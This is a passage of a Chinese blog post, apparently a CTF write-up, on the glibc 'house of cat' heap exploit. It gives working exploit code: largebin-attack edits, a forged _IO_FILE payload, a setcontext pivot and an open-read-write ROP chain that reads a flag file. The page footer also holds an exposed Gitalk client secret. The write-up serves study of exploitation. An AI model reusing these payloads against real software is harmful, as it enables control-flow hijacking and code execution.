+<h2 id="step2-largebin-attack"><a href="#step2-largebin-attack" class="headerlink" title="step2 largebin attack"></a>step2 largebin attack</h2><p>关于largebin attack的细节可以参考<a href="https://nicholas-wei.github.io/2022/01/29/largebin-attack/#glibc2-31">我之前学习的文章</a>。注意在2.31之后对于largebin的利用也有一些变化。这里就要利用最后一种方式。</p>
+<p>可以看到程序给了我们两个edit的机会。第一次：我们要用largebin attack改掉libc中stderr的指针，改向一个chunk，里面是伪造的FILE table。第二次：我们要用largebin attack改掉top chunk的size，从而触发malloc_assert的IO流错误。回顾一下largebin attack在2.31之后的利用手段，总结如下。</p>
+<blockquote>
+<p>分配两个chunk，他们两个大小需要在一个largebin范围内，但是不能相同(例如0x418和0x428)。记小的chunk为A，大的为B。</p>
+<p>首先free(B)，B会进入unsorted bin，之后add一个更大的块，将B放入largebin中。</p>
+<p>修改B的bk_nextsize为target-0x20。</p>
+<p>释放A，A进入unsortedbin</p>
+<p>add一个更大的块，让A进入largebin。此时target中就会被写上A所在的地址。</p>
+</blockquote>
+<p>如果把target写成stderr，A中布置好一个fake IO_FILE结构体，那么就可以完成一次FSOP。</p>
+<h3 id="第一次攻击"><a href="#第一次攻击" class="headerlink" title="第一次攻击"></a>第一次攻击</h3><p>我们首先来看这道题已经对堆做的相关操作。（也就是到后面泄露堆为止的操作）</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>index</th>
+<th>大小</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>add</td>
+<td>0</td>
+<td>0x420</td>
+</tr>
+<tr>
+<td>add</td>
+<td>1</td>
+<td>0x430</td>
+</tr>
+<tr>
+<td>add</td>
+<td>2</td>
+<td>0x418</td>
+</tr>
+<tr>
+<td>delete</td>
+<td>0</td>
+<td>0x420</td>
+</tr>
+<tr>
+<td>add</td>
+<td>3</td>
+<td>0x440</td>
+</tr>
+</tbody></table>
+<p>现在0在largebin中，我们第一步就是修改0号chunk的next_size部分为target-0x20。这里设置为stderr-0x20即可。</p>
+<p>之后我们将2释放，也就是delete(2)，现在chunk2就在unsortedbin中。我们申请一个大的块，将2放入largebin，就能完成这次的攻击。具体的代码如下。这里一开始变成了delete(6)，是一样的，先把2取出来给6，因此2和6相同了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">6</span>,<span class="number">0x418</span>,payload1) <span class="comment"># 申请一个比原先chunk小的块，但是要在一个size map里面</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># 删掉chunk6，进入unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack，修改bk_nextsize</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x290</span>) + p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,<span class="string">&#x27;aaaaa&#x27;</span>) <span class="comment"># 使得chunk6从unsortedbin进入largebin</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第二次攻击"><a href="#第二次攻击" class="headerlink" title="第二次攻击"></a>第二次攻击</h3><p>第二次攻击的目标是top chunk的size字段。方法和之前类似。不过现在的target address变成了堆的基地址加上一个偏移量。代码如下所示</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;eee&#x27;</span>) <span class="comment"># 小的chunk</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># 删除5，则5进入unsortedbin</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x450</span>,p64(<span class="number">0</span>)+p64(<span class="number">1</span>)) <span class="comment"># put 5 into largebin</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># 删除8，现在8在unsortedbin中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack，修改bk_nextsize为top chunk的size部分，想要写入一个大数作为生意空间，引起报错，其余尽量保持不变。</span></span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x1370</span>)+p64(heap_base+<span class="number">0x28e0</span>-<span class="number">0x20</span>+<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
+
+<p>此时如果我们再去add一个大块，将会触发以下内容</p>
+<ol>
+<li>对unsortedbin进行检查，将小的chunk放到largebin</li>
+<li>触发largebin attack，修改top chunk的size</li>
+<li>分配一个块的时候触发top chunk size的检查，触发FSOP。而此时stderr正是我们在第一次攻击中布置好的伪造的chunk。此时通过chunk中不同位置判断条件触发<code>_IO_switch_to_wget_mode</code>在跳转到<code>setcontext</code>就可以完成攻击了。</li>
+</ol>
+<h2 id="step3-setcontext"><a href="#step3-setcontext" class="headerlink" title="step3 setcontext"></a>step3 setcontext</h2><p>由于这道题存在沙箱，我们需要使用set_context+0x3d。具体使用方法是找到libc中的如下函数。蓝色框中的位置</p>
+<p><img src="/.io//image-20220803190420908.png" alt="image-20220803190420908"></p>
+<p>跳转到的位置</p>
+<p><img src="/.io//image-20220803190452900.png" alt="image-20220803190452900"></p>
+<p>因此我们可以将rdx+0xa8作为ROP的开始，后面这个地址将作为新的栈顶指针。之后布置一系列寄存器作为参数传递。当然在我们已经拿到libc之后，也不用管理参数，后面ROP自行修改即可。</p>
+<h2 id="构造ROP和FILE"><a href="#构造ROP和FILE" class="headerlink" title="构造ROP和FILE"></a>构造ROP和FILE</h2><h3 id="伪造FILE"><a href="#伪造FILE" class="headerlink" title="伪造FILE"></a>伪造FILE</h3><p>这里是这道题最难的地方。我们怎么构造伪造的FILE结构体，布置好参数，跳转到set context执行命令呢？我们重点分析以下payload，这是fake file的具体内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) <span class="comment"># heap_base+0xb30，rax1</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>) <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>) <span class="comment"># rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># call addr, here is [rax+0x18]</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span> )  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)*<span class="number">2</span> <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2  rax+0xe0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x17d0</span></span><br><span class="line">payload1 = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br></pre></td></tr></table></figure>
+
+<p>结合以下汇编分析。回忆一下我们首先通过一些flags的位置变化来让stderr执行到这个函数。此时我们只有<code>rdi</code>是可控的。<code>rdi</code>也就是这个fake file的指针。指向一开始的四个p64(0)。</p>
+<p><img src="/.io//image-20220803204441077.png" alt="image-20220803204441077"></p>
+<p>首先看我们把[rdi+0xa0]移动到rax。在上面的伪造FILE中，也就是<code>heap_base+0xb30</code>。而这个地址，实际上指向的是什么呢？我们动态调试一下。用以下命令下断点。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io,<span class="string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20220803204944167.png" alt="image-20220803204944167"></p>
+<p>这一步之后，就是上面wget相关函数。我们在运行完将结果给到rax之后，看一看rax。发现其实是伪造FILE的第二行。</p>
+<p><img src="/.io//image-20220803205215090.png" alt="image-20220803205215090"></p>
+<p><img src="/.io//image-20220803205116039.png" alt="image-20220803205116039"></p>
+<p>接下来两句汇编</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7fd903968d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">► <span class="number">0x7fd903968d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行之后rdx是</p>
+<p><img src="/.io//image-20220803205425221.png" alt="image-20220803205425221"></p>
+<p><img src="/.io//image-20220803205837782.png" alt="image-20220803205837782"></p>
+<p>这个地址里面存的内容是什么呢？不着急，我们往下看。</p>
+<p>不过接下来，到达了以下汇编部分</p>
+<p><img src="/.io//image-20220803205954089.png" alt="image-20220803205954089"></p>
+<p>这里经过cmp之后，并没有在jmp跳转。直接进入了后面。好，在这里我们重新设置了rax。而这里的rax也和我们最重要调用的函数息息相关。我们原本的rax是</p>
+<p><img src="/.io//image-20220803210235857.png" alt="image-20220803210235857"></p>
+<p>之后，加上0xe0并解引用之后的结果如下。而这部分在Fake_file中的体现也就是第18行，在未解引用的时候位于FAKE_FILE第四行1的位置，解引用之后加上0x18的偏移量，正好是setcontext的地址。</p>
+<p><img src="/.io//image-20220803210429210.png" alt="image-20220803210429210"></p>
+<p><img src="/.io//image-20220803210700762.png" alt="image-20220803210700762"></p>
+<p>好，在进入setcontext之前我们看一眼寄存器。</p>
+<p><img src="/.io//image-20220803210723931.png" alt="image-20220803210723931"></p>
+<h3 id="setcontext的具体构造"><a href="#setcontext的具体构造" class="headerlink" title="setcontext的具体构造"></a>setcontext的具体构造</h3><p>在setcontext中，我们将要经过两次跳转。第一次的jump是必然发生的。但是第一次跳转我们其实只需要其中的一条汇编，<strong>也就是修改rsp为ROP的起始位置（注意看现在rsp为pop rdi了）</strong>。注意看这里是根据rdx的偏移来放置内容的。<strong>好，到这里就明确了，之前我们在fake_file中放置的rdx的值(见FAKE_FILE旁的注释)实际上和最终的ROP链息息相关</strong>。怎么计算呢？<strong>看到这里取出的是[rdx+0xa0]，那么实际上就是在第9个chunk中的ROP链==所在的地址==减去0xa0</strong>。</p>
+<p><img src="/.io//image-20220803211025031.png" alt="image-20220803211025031"></p>
+<p>如下所示。注意不是ROP链的地址，是<strong>所在的地址</strong>。而这个地址我们可以人为的写在某个地方。在这里，就是FAKE_FILE最后末尾的<code>p64(heap_base+0x2050)</code></p>
+<p><img src="/.io//image-20220803211921211.png" alt="image-20220803211921211"></p>
+<p>接下来的几个赋值并不重要。重要的是我们一定会完成这个跳转。注意这里push了一个rcx。这个也是当前rdx偏移计算的。**这个值正是我们伪造的FILE的最后一个字段内容p64(ret)**。其实就是一个ret。</p>
+<p><img src="/.io//image-20220803212712115.png" alt="image-20220803212712115"></p>
+<p>其实跳转之后的汇编也可以用来布置参数(当GADGET比较少的情况下)。我们此时rdx依然是之前的位置没有变。可以通过此处布置参数(可以看到rsi,rdi都在里面了)也可以在后面ROP的时候自己构造。这里提前防止参数的好处就是在无法泄露堆地址的情况下，可以直接获取堆对应位置字符串。如果后续使用ROP需要知道堆地址。</p>
+<p><img src="/.io//image-20220803212846993.png" alt="image-20220803212846993"></p>
+<p>终于，到了ROP</p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><img src="/.io//image-20220803213503330.png" alt="image-20220803213503330"></p>
+<p>这里由于只允许文件描述符0，因此先关闭0，之后打开文件的时候文件描述符自动会变成0。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close)+p64(pop_rdi)+p64(flag_addr)+\</span><br><span class="line">    p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscallret)+\</span><br><span class="line">        p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(flag_addr)+\</span><br><span class="line">            p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_func)+\</span><br><span class="line">                p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write_func)</span><br></pre></td></tr></table></figure>
+
+<p>其实之后也就不复杂了。先close(0)之后就是正常的ORW。由于我们当前有储存在chunk的文件名“flag”，也有堆地址，可以任意指定一个地方储存flag内容。因此剩下的就不复杂了。我们也可以在这里布置参数，就不需要setcontext布置了。</p>
+<p>这里还学到一个就是libc的read write等参数调用和系统调用是一模一样的。其实这里用了glibc的，用系统调用也完全没有问题。(并且好像glibc也就是在外面套了一层壳)</p>
+<p><img src="/.io//image-20220803214011619.png" alt="image-20220803214011619"></p>
+<p><img src="/.io//image-20220803214029132.png" alt="image-20220803214029132"></p>
+<p><img src="/.io//image-20220803214112302.png" alt="image-20220803214112302"></p>
+<p>至此这道题结束了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>这道题最重要的是提供了一种IO_FILE中，控制其重要寄存器rdx，并且调用set context的一种手法。首先这道题用largebin attack改了stderr，写成了一个chunk，之后触发malloc_assert，在chunk中写FAKE_FILE，触发set_context，完成ROP。如果这道题没有开沙箱，那么直接将chunk开头的部分写成/bin/sh(将会存在rdi中)，调用的函数写成system即可。</p>
+<p>回顾一下构造的IO_FILE。看看要改什么地方。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) <span class="comment"># heap_base+0xb30，rax1</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>) <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>) <span class="comment"># rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># call addr, here is [rax+0x18]</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span> )  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)*<span class="number">2</span> <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2  rax+0xe0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x17d0</span></span><br><span class="line">payload1 = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br></pre></td></tr></table></figure>
+
+<p>从上往下看，这里的第5行，需要改成<strong>存放ROP指令的chunk的地址减去0xa0之后的数值存放的地址</strong>。用一张图表示，不然太拗口了。就是填0x210。而地址A-0xa0的数值，可以填在这个FILE结构体后面(就相当于下面绿色的块，不过填在哪里都可以)</p>
+<p><img src="/.io//image-20220803221156089.png" alt="image-20220803221156089"></p>
+<p>第六行填写要调用的函数的地址。</p>
+<p>第12行填写指向第二行p64(0)所在的地址</p>
+<p>第16行写入上面这个固定的内容，绕过vtable的检验。可以通过以下方式找到。</p>
+<p><img src="/.io//image-20220803221641708.png" alt="image-20220803221641708"></p>
+<p>第18行rax2将会指向第四行的p64(1)的位置，影响到后面call的函数。</p>
+<p>最后一行中末尾还需要加一个ret的gadget，通过在set_context中rdx的偏移找到，并且用于在ROP中（因为一开始会push一个rcx，就是这个值）</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>泄露libc和堆（很多地方用到了偏移）</li>
+<li>能够通过largebin attack或者tcache stashing unlink等修改stderr(可控地址写入可控值)</li>
+<li>能够触发malloc_assert流(例如top chunk的size出错，基本上所有malloc相关的出错都会调用assert)</li>
+</ol>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273895.htm#msg_header_h2_4">https://bbs.pediy.com/thread-273895.htm#msg_header_h2_4</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/08/02/house-of-cat/">house-of-cat</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-08-02, 11:43:12</p>
+        <p><span>最后更新:</span>2023-02-05, 12:16:20</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/08/02/house-of-cat/" title="house-of-cat">https://nicholas-wei.github.io/2022/08/02/house-of-cat/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/08/02/house-of-cat/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/08/04/crafting-interpreters2/">
+                    crafting-interpreters2——scanning
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/07/29/crafting-interpreters1/">
+                    crafting_interpreters 1
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">house of cat攻击手法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">house of cat题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#step1-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">step1 泄露地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step2-largebin-attack"><span class="toc-number">2.2.</span> <span class="toc-text">step2 largebin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.1.</span> <span class="toc-text">第一次攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.</span> <span class="toc-text">第二次攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step3-setcontext"><span class="toc-number">2.3.</span> <span class="toc-text">step3 setcontext</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ROP%E5%92%8CFILE"><span class="toc-number">2.4.</span> <span class="toc-text">构造ROP和FILE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0FILE"><span class="toc-number">2.4.1.</span> <span class="toc-text">伪造FILE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setcontext%E7%9A%84%E5%85%B7%E4%BD%93%E6%9E%84%E9%80%A0"><span class="toc-number">2.4.2.</span> <span class="toc-text">setcontext的具体构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP"><span class="toc-number">2.4.3.</span> <span class="toc-text">ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">2.5.1.</span> <span class="toc-text">构造方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.5.2.</span> <span class="toc-text">利用条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"house-of-cat　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/08/04/crafting-interpreters2/" title="上一篇: crafting-interpreters2——scanning">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/07/29/crafting-interpreters1/" title="下一篇: crafting_interpreters 1">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" 